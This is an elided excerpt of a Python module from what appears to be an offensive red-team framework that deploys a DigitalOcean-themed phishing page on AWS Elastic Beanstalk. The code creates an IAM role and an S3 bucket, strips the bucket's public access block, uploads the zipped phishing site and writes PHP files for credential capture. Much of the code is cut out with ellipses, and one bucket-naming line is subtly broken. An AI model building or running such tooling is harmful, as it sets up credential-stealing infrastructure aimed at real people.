# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\initialaccess\__not_done\aws_elasticbeanstalk_deploy_digitalocean_phishing_page.py
import json
import os
import random
import shutil
...
def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
    ...
    status = createElasticBeanStalkApp(
        profile, codebucket, s3Profile, projectname, iamProfile, projectrole
    )

    return status


def createElasticBeanStalkApp(
    profile, codebucket, s3Profile, projectname, iamProfile, projectrole
):
    try:
        if codebucket == "":
            codebucket = "dophishing-".join(
                random.choice(string.digits + string.ascii_lowercase) for _ in range(10)
            )
        ...
        try:
            ...
            rolearn = iamProfile.create_role(
                RoleName=projectrole, AssumeRolePolicyDocument=rolepolicy
            )["Role"]["Arn"]
            ...
            rolearn = iamProfile.get_role(RoleName=projectrole)["Role"]["Arn"]

        # Convert the policy to a JSON string
        bucket_policy = json.dumps(bucket_policy)

        # Set the new policy on the bucket
        s3Profile.delete_public_access_block(Bucket=codebucket)

        s3Profile.put_bucket_policy(Bucket=codebucket, Policy=bucket_policy)

        shutil.make_archive(
            "core/module/initialaccess/__do_phishing_output/code",
            "zip",
        ...
        with open(
            "core/module/initialaccess/__do_phishing_output/code.zip", "rb"
        ) as body:
        ...
        s3_source = {"S3Bucket": codebucket, "S3Key": "code.zip"}

        profile.create_application(ApplicationName=projectname)

        profile.create_application_version(
            ApplicationName=projectname, VersionLabel="v1", SourceBundle=s3_source
        )
        ...
        status = profile.describe_environments(EnvironmentNames=[projectname])[
            "Environments"
        ][0]["Status"]

        time.sleep(10)

        eventResponse = profile.describe_events(EnvironmentName=projectname)["Events"]
...
def generatePHPFiles(dbserver, dbuser, dbpass, dourl):
    ...
    with open(
        "core/module/initialaccess/__do_phishing/credentials.php", "w"
    ) as phpconfigfile:
    ...
    with open(
        "core/module/initialaccess/__do_phishing/nexttogo.php", "w"
    ) as nexttogofile:
